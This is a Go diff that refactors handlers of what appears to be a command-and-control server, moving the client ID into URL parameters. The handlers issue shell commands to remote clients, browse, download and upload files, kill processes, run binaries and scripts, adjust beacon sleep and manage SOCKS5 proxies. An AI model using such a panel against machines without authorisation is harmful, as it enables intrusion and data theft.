@@ -39,8 +39,8 @@ func GetClients(c *gin.Context) {
 	})
 }
 func SendCommands(c *gin.Context) {
+	uid := c.Param("uid")
 	var commands struct {
-		Uid     string `form:"uid"`
 		Command string `json:"command"`
 	}
 	if err := c.ShouldBindJSON(&commands); err != nil {
@@ -49,50 +49,27 @@ func SendCommands(c *gin.Context) {
 	}
 
 	var shellHistory database.Shell
-	database.Engine.Where("uid = ?", commands.Uid).Get(&shellHistory)
+	database.Engine.Where("uid = ?", uid).Get(&shellHistory)
 	shellHistory.ShellContent = shellHistory.ShellContent + "$ " + commands.Command + "\n"
-	database.Engine.Where("uid = ?", commands.Uid).Update(&shellHistory)
+	database.Engine.Where("uid = ?", uid).Update(&shellHistory)
 
-	sendcommand.SendCommand(commands.Uid, commands.Command)
+	sendcommand.SendCommand(uid, commands.Command)
 
 	response.OK(c, shellHistory.ShellContent)
 }
 
 func GetShellContent(c *gin.Context) {
-	var shellContent struct {
-		Uid string `form:"uid"`
-	}
-	if err := c.ShouldBindQuery(&shellContent); err != nil {
-		response.ValidationError(c, response.ParseValidationErrors(err))
-		return
-	}
+	uid := c.Param("uid")
 	var shell database.Shell
-	database.Engine.Where("uid = ?", shellContent.Uid).Get(&shell)
+	database.Engine.Where("uid = ?", uid).Get(&shell)
 	response.OK(c, shell.ShellContent)
-	//var body struct {
-	//	Uid string `form:"uid"`
-	//}
-	//
-	//if err := c.ShouldBindQuery(&body); err != nil {
-	//	c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
-	//}
-	//fmt.Println(body.Uid)
-	//var shell database.Shell
-	//database.Engine.Where("uid = ?", body.Uid).Get(&shell)
-	//c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": shell.ShellContent})
 }
 func GetPidList(c *gin.Context) {
-	var shellContent struct {
-		Uid string `form:"uid"`
-	}
-	if err := c.ShouldBindQuery(&shellContent); err != nil {
-		response.ValidationError(c, response.ParseValidationErrors(err))
-		return
-	}
+	uid := c.Param("uid")
 	// 创建 UID 对应的通道队列
-	queue := command.VarPidQueue.GetOrCreateQueue(shellContent.Uid)
+	queue := command.VarPidQueue.GetOrCreateQueue(uid)
 
-	sendcommand.SendCommand(shellContent.Uid, "ps")
+	sendcommand.SendCommand(uid, "ps")
 
 	// 创建一个 context 并设置超时
 	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
@@ -108,23 +85,17 @@ func GetPidList(c *gin.Context) {
 	}
 }
 func KillPid(c *gin.Context) {
-	var pidBody struct {
-		Uid string `json:"uid"`
-		Pid string `json:"pid"`
-	}
-	if err := c.ShouldBindJSON(&pidBody); err != nil {
-		response.ValidationError(c, response.ParseValidationErrors(err))
-		return
-	}
-	sendcommand.SendCommand(pidBody.Uid, "kill "+pidBody.Pid)
+	uid := c.Param("uid")
+	pid := c.Param("pid")
+	sendcommand.SendCommand(uid, "kill "+pid)
 	response.OK(c, "killed")
 }
 func FileBrowse(c *gin.Context) {
+	uid := c.Param("uid")
 	var fileBody struct {
-		Uid     string `json:"uid"`
-		DirPath string `json:"dirPath"`
+		DirPath string `form:"dirPath"`
 	}
-	if err := c.ShouldBindJSON(&fileBody); err != nil {
+	if err := c.ShouldBindQuery(&fileBody); err != nil {
 		response.ValidationError(c, response.ParseValidationErrors(err))
 		return
 	}
@@ -133,12 +104,12 @@ func FileBrowse(c *gin.Context) {
 		return
 	}
 
-	queue := command.VarFileBrowserQueue.GetOrCreateQueue(fileBody.Uid)
+	queue := command.VarFileBrowserQueue.GetOrCreateQueue(uid)
 	if strings.HasSuffix(fileBody.DirPath, ":") {
 		fileBody.DirPath += "/"
 	}
 	//fmt.Println("dirPath:", fileBody.DirPath)
-	sendcommand.SendCommand(fileBody.Uid, "filebrowse "+fileBody.DirPath)
+	sendcommand.SendCommand(uid, "filebrowse "+fileBody.DirPath)
 
 	// 创建一个 context 并设置超时
 	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
@@ -147,7 +118,7 @@ func FileBrowse(c *gin.Context) {
 	// 等待从通道接收 PID 列表
 	select {
 	case fileBrowseStr := <-queue:
-		fileTree := command.ParseDirectoryString(fileBody.Uid, fileBrowseStr)
+		fileTree := command.ParseDirectoryString(uid, fileBrowseStr)
 		response.OK(c, fileTree)
 	case <-ctx.Done():
 		response.Timeout(c)
@@ -155,23 +126,23 @@ func FileBrowse(c *gin.Context) {
 
 }
 func FileDelete(c *gin.Context) {
+	uid := c.Param("uid")
 	var fileBody struct {
-		Uid      string `json:"uid"`
-		FilePath string `json:"filePath"`
+		FilePath string `form:"filePath"`
 	}
-	if err := c.ShouldBindJSON(&fileBody); err != nil {
+	if err := c.ShouldBindQuery(&fileBody); err != nil {
 		response.ValidationError(c, response.ParseValidationErrors(err))
 		return
 	}
 
-	queue := command.VarFileBrowserQueue.GetOrCreateQueue(fileBody.Uid)
+	queue := command.VarFileBrowserQueue.GetOrCreateQueue(uid)
 
 	var dirPath string
 	lastSlashIndex := strings.LastIndex(fileBody.FilePath, "/")
 	if lastSlashIndex != -1 {
 		dirPath = fileBody.FilePath[:lastSlashIndex+1]
 	}
-	sendcommand.SendCommand(fileBody.Uid, "filebrowse "+dirPath)
+	sendcommand.SendCommand(uid, "filebrowse "+dirPath)
 
 	// 创建一个 context 并设置超时
 	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
@@ -180,15 +151,15 @@ func FileDelete(c *gin.Context) {
 	// 等待从通道接收 PID 列表
 	select {
 	case fileBrowseStr := <-queue:
-		fileTree := command.ParseDirectoryString(fileBody.Uid, fileBrowseStr)
+		fileTree := command.ParseDirectoryString(uid, fileBrowseStr)
 		response.OK(c, fileTree)
 	case <-ctx.Done():
 		response.Timeout(c)
 	}
 }
 func MakeDir(c *gin.Context) {
+	uid := c.Param("uid")
 	var dirBody struct {
-		Uid     string `json:"uid"`
 		DirPath string `json:"dirPath"`
 	}
 	if err := c.ShouldBindJSON(&dirBody); err != nil {
@@ -196,14 +167,14 @@ func MakeDir(c *gin.Context) {
 		return
 	}
 
-	queue := command.VarFileBrowserQueue.GetOrCreateQueue(dirBody.Uid)
+	queue := command.VarFileBrowserQueue.GetOrCreateQueue(uid)
 
 	var dirPath string
 	lastSlashIndex := strings.LastIndex(dirBody.DirPath, "/")
 	if lastSlashIndex != -1 {
 		dirPath = dirBody.DirPath[:lastSlashIndex+1]
 	}
-	sendcommand.SendCommand(dirBody.Uid, "filebrowse "+dirPath)
+	sendcommand.SendCommand(uid, "filebrowse "+dirPath)
 
 	// 创建一个 context 并设置超时
 	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
@@ -212,7 +183,7 @@ func MakeDir(c *gin.Context) {
 	// 等待从通道接收 PID 列表
 	select {
 	case fileBrowseStr := <-queue:
-		fileTree := command.ParseDirectoryString(dirBody.Uid, fileBrowseStr)
+		fileTree := command.ParseDirectoryString(uid, fileBrowseStr)
 		response.OK(c, fileTree)
 	case <-ctx.Done():
 		response.Timeout(c)
@@ -240,7 +211,7 @@ func FileUpload(c *gin.Context) {
 	}
 
 	// 获取其他表单字段
-	uid := c.PostForm("uid")
+	uid := c.Param("uid")
 	uploadPath := c.PostForm("uploadPath")
 
 	uploadPathBytes := []byte(uploadPath)
@@ -269,20 +240,14 @@ func FileUpload(c *gin.Context) {
 	response.OK(c, nil)
 }
 func GetNote(c *gin.Context) {
-	var noteBody struct {
-		Uid string `form:"uid"`
-	}
-	if err := c.ShouldBindQuery(&noteBody); err != nil {
-		response.ValidationError(c, response.ParseValidationErrors(err))
-		return
-	}
+	uid := c.Param("uid")
 	var Note database.Notes
-	database.Engine.Where("uid = ?", noteBody.Uid).Get(&Note)
+	database.Engine.Where("uid = ?", uid).Get(&Note)
 	response.OK(c, Note.Note)
 }
 func SaveNote(c *gin.Context) {
+	uid := c.Param("uid")
 	var noteBody struct {
-		Uid         string `json:"uid"`
 		NoteContent string `json:"noteContent"`
 	}
 	if err := c.ShouldBindJSON(&noteBody); err != nil {
@@ -290,14 +255,14 @@ func SaveNote(c *gin.Context) {
 		return
 	}
 	var Note database.Notes
-	database.Engine.Where("uid = ?", noteBody.Uid).Get(&Note)
+	database.Engine.Where("uid = ?", uid).Get(&Note)
 	Note.Note = noteBody.NoteContent
-	database.Engine.Where("uid = ?", noteBody.Uid).Update(&Note)
+	database.Engine.Where("uid = ?", uid).Update(&Note)
 	response.OK(c, nil)
 }
 func DownloadFile(c *gin.Context) {
+	uid := c.Param("uid")
 	var fileBody struct {
-		Uid      string `json:"uid"`
 		FilePath string `json:"filePath"`
 	}
 
@@ -307,13 +272,13 @@ func DownloadFile(c *gin.Context) {
 	}
 
 	// 验证输入参数
-	if fileBody.Uid == "" || fileBody.FilePath == "" {
+	if fileBody.FilePath == "" {
 		response.BadRequest(c, "UID and file path are required")
 		return
 	}
 
 	// 验证 UID 格式
-	if strings.Contains(fileBody.Uid, "..") || strings.Contains(fileBody.Uid, "/") || strings.Contains(fileBody.Uid, "\\") {
+	if strings.Contains(uid, "..") || strings.Contains(uid, "/") || strings.Contains(uid, "\\") {
 		response.BadRequest(c, "Invalid UID format")
 		return
 	}
@@ -325,7 +290,7 @@ func DownloadFile(c *gin.Context) {
 	}
 
 	// 使用安全路径创建下载目录
-	downloadDir := filepath.Join("./Downloads", fileBody.Uid)
+	downloadDir := filepath.Join("./Downloads", uid)
 
 	// 确保下载目录存在
 	if err := os.MkdirAll(downloadDir, 0755); err != nil {
@@ -346,7 +311,7 @@ func DownloadFile(c *gin.Context) {
 
 	// 数据库操作
 	var fileDownloads database.Downloads
-	exist, err := database.Engine.Where("uid = ? AND file_path = ?", fileBody.Uid, fileBody.FilePath).Get(&fileDownloads)
+	exist, err := database.Engine.Where("uid = ? AND file_path = ?", uid, fileBody.FilePath).Get(&fileDownloads)
 	if err != nil {
 		logger.Error("Database query failed: %v", err)
 		response.InternalError(c)
@@ -356,7 +321,7 @@ func DownloadFile(c *gin.Context) {
 	if !exist {
 		// 插入新记录
 		downloadRecord := &database.Downloads{
-			Uid:            fileBody.Uid,
+			Uid:            uid,
 			FileName:       safeFileName,
 			FilePath:       fileBody.FilePath,
 			FileSize:       0,
@@ -374,7 +339,7 @@ UPDATE downloads
 SET file_size = ?, downloaded_size = ?
 WHERE uid = ? AND file_path = ?;
 `
-		_, err := database.Engine.Exec(sql, 0, 0, fileBody.Uid, fileBody.FilePath)
+		_, err := database.Engine.Exec(sql, 0, 0, uid, fileBody.FilePath)
 		if err != nil {
 			logger.Error("Failed to update download record: %v", err)
 			response.InternalError(c)
@@ -383,7 +348,7 @@ WHERE uid = ? AND file_path = ?;
 	}
 
 	// 发送下载命令
-	sendcommand.SendCommand(fileBody.Uid, "download "+fileBody.FilePath)
+	sendcommand.SendCommand(uid, "download "+fileBody.FilePath)
 	response.OK(c, nil)
 }
 
@@ -395,15 +360,9 @@ type DownloadsInfo struct {
 }
 
 func GetDownloadsInfo(c *gin.Context) {
-	var downloadBody struct {
-		Uid string `form:"uid"`
-	}
-	if err := c.ShouldBindQuery(&downloadBody); err != nil {
-		response.ValidationError(c, response.ParseValidationErrors(err))
-		return
-	}
+	uid := c.Param("uid")
 	var downloads []database.Downloads
-	database.Engine.Where("uid = ?", downloadBody.Uid).Find(&downloads)
+	database.Engine.Where("uid = ?", uid).Find(&downloads)
 	var result []DownloadsInfo
 	for _, download := range downloads {
 		var tmpDownloadsInfo DownloadsInfo
@@ -421,8 +380,8 @@ func GetDownloadsInfo(c *gin.Context) {
 	response.OK(c, result)
 }
 func DownloadDownloadedFile(c *gin.Context) {
+	uid := c.Param("uid")
 	var downloadBody struct {
-		Uid      string `json:"uid"`
 		FilePath string `json:"filePath"`
 	}
 
@@ -432,7 +391,7 @@ func DownloadDownloadedFile(c *gin.Context) {
 	}
 
 	// 使用通用的安全路径函数验证文件路径
-	fullPath, err := utils.GetSafeFilePath(downloadBody.Uid, downloadBody.FilePath)
+	fullPath, err := utils.GetSafeFilePath(uid, downloadBody.FilePath)
 	if err != nil {
 		response.BadRequest(c, "Invalid file path")
 		return
@@ -459,17 +418,11 @@ func DownloadDownloadedFile(c *gin.Context) {
 	c.File(fullPath)
 }
 func ListDrives(c *gin.Context) {
-	var drivesBody struct {
-		Uid string `form:"uid"`
-	}
-	if err := c.ShouldBindQuery(&drivesBody); err != nil {
-		response.ValidationError(c, response.ParseValidationErrors(err))
-		return
-	}
+	uid := c.Param("uid")
 
-	queue := command.VarDrivesQueue.GetOrCreateQueue(drivesBody.Uid)
+	queue := command.VarDrivesQueue.GetOrCreateQueue(uid)
 
-	sendcommand.SendCommand(drivesBody.Uid, "drives")
+	sendcommand.SendCommand(uid, "drives")
 
 	// 创建一个 context 并设置超时
 	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
@@ -479,25 +432,25 @@ func ListDrives(c *gin.Context) {
 	select {
 	case fileBrowseStr := <-queue:
 		//fmt.Println("fileBrowseStr", fileBrowseStr)
-		fileTree := command.ParseDrives(drivesBody.Uid, fileBrowseStr)
+		fileTree := command.ParseDrives(uid, fileBrowseStr)
 		response.OK(c, fileTree)
 	case <-ctx.Done():
 		response.Timeout(c)
 	}
 }
 func FetchFileContent(c *gin.Context) {
+	uid := c.Param("uid")
 	var contentBody struct {
-		Uid      string `json:"uid"`
-		FilePath string `json:"path"`
+		FilePath string `form:"path"`
 	}
-	if err := c.ShouldBindJSON(&contentBody); err != nil {
+	if err := c.ShouldBindQuery(&contentBody); err != nil {
 		response.ValidationError(c, response.ParseValidationErrors(err))
 		return
 	}
 
-	queue := command.VarFileContentQueue.GetOrCreateQueue(contentBody.Uid, contentBody.FilePath)
+	queue := command.VarFileContentQueue.GetOrCreateQueue(uid, contentBody.FilePath)
 
-	sendcommand.SendCommand(contentBody.Uid, "filecontent "+contentBody.FilePath)
+	sendcommand.SendCommand(uid, "filecontent "+contentBody.FilePath)
 
 	// 创建一个 context 并设置超时
 	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
@@ -513,26 +466,20 @@ func FetchFileContent(c *gin.Context) {
 
 }
 func ExitClient(c *gin.Context) {
-	var clientBody struct {
-		Uid string `form:"uid"`
-	}
-	if err := c.ShouldBindQuery(&clientBody); err != nil {
-		response.ValidationError(c, response.ParseValidationErrors(err))
-		return
-	}
-	sendcommand.SendCommand(clientBody.Uid, "exit")
+	uid := c.Param("uid")
+	sendcommand.SendCommand(uid, "exit")
 
 	go func() {
 		var client database.Clients
-		database.Engine.Where("uid = ?", clientBody.Uid).Get(&client)
+		database.Engine.Where("uid = ?", uid).Get(&client)
 		duration, _ := time.ParseDuration(client.Sleep + "s")
 		time.Sleep(duration)
-		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Clients))
-		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Downloads))
-		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Notes))
-		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Shell))
+		database.Engine.Where("uid = ?", uid).Delete(new(database.Clients))
+		database.Engine.Where("uid = ?", uid).Delete(new(database.Downloads))
+		database.Engine.Where("uid = ?", uid).Delete(new(database.Notes))
+		database.Engine.Where("uid = ?", uid).Delete(new(database.Shell))
 		var socks5 []database.Socks5
-		database.Engine.Where("uid = ?", clientBody.Uid).Find(&socks5)
+		database.Engine.Where("uid = ?", uid).Find(&socks5)
 		for _, socks5i := range socks5 {
 			if _, exists := proxy.Socks5Serve[socks5i.Socks5port]; exists {
 				err := proxy.Socks5Serve[socks5i.Socks5port].Close()
@@ -540,20 +487,20 @@ func ExitClient(c *gin.Context) {
 				delete(proxy.Socks5Serve, socks5i.Socks5port)
 				proxy.MuSocks5Serve.Unlock()
 				if err != nil {
-					logger.Error("Socks5 closed failed for uid %s", clientBody.Uid)
+					logger.Error("Socks5 closed failed for uid %s", uid)
 					return
 				}
 			}
 		}
-		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Socks5))
-		delete(command.UidFileBrowser, clientBody.Uid)
+		database.Engine.Where("uid = ?", uid).Delete(new(database.Socks5))
+		delete(command.UidFileBrowser, uid)
 	}()
 
 	response.OK(c, nil)
 }
 func AddUidNote(c *gin.Context) {
+	uid := c.Param("uid")
 	var noteBody struct {
-		Uid  string `json:"uid"`
 		Note string `json:"note"`
 	}
 	if err := c.ShouldBindJSON(&noteBody); err != nil {
@@ -561,32 +508,32 @@ func AddUidNote(c *gin.Context) {
 		return
 	}
 
-	database.Engine.Where("uid = ?", noteBody.Uid).Update(&database.Clients{Note: noteBody.Note})
+	database.Engine.Where("uid = ?", uid).Update(&database.Clients{Note: noteBody.Note})
 	response.OK(c, nil)
 }
 func EditSleep(c *gin.Context) {
+	uid := c.Param("uid")
 	var sleepBody struct {
-		Uid   string `json:"uid"`
 		Sleep string `json:"sleep"`
 	}
 	if err := c.ShouldBindJSON(&sleepBody); err != nil {
 		response.ValidationError(c, response.ParseValidationErrors(err))
 		return
 	}
-	database.Engine.Where("uid = ?", sleepBody.Uid).Update(&database.Clients{Sleep: sleepBody.Sleep})
-	sendcommand.SendCommand(sleepBody.Uid, "sleep "+sleepBody.Sleep)
+	database.Engine.Where("uid = ?", uid).Update(&database.Clients{Sleep: sleepBody.Sleep})
+	sendcommand.SendCommand(uid, "sleep "+sleepBody.Sleep)
 	response.OK(c, nil)
 }
 func EditColor(c *gin.Context) {
+	uid := c.Param("uid")
 	var colorBody struct {
-		Uid   string `json:"uid"`
 		Color string `json:"color"`
 	}
 	if err := c.ShouldBindJSON(&colorBody); err != nil {
 		response.ValidationError(c, response.ParseValidationErrors(err))
 		return
 	}
-	database.Engine.Where("uid = ?", colorBody.Uid).Update(&database.Clients{Color: colorBody.Color})
+	database.Engine.Where("uid = ?", uid).Update(&database.Clients{Color: colorBody.Color})
 	response.OK(c, nil)
 }
 func ExecuteBin(c *gin.Context) {
@@ -610,7 +557,7 @@ func ExecuteBin(c *gin.Context) {
 		return
 	}
 
-	uid := c.PostForm("uid")
+	uid := c.Param("uid")
 	args := c.PostForm("args")
 	mode := c.PostForm("mode")
 
@@ -682,7 +629,7 @@ func ExecuteLinuxScript(c *gin.Context) {
 		return
 	}
 
-	uid := c.PostForm("uid")
+	uid := c.Param("uid")
 	args := c.PostForm("args")
 
 	var shellHistory database.Shell
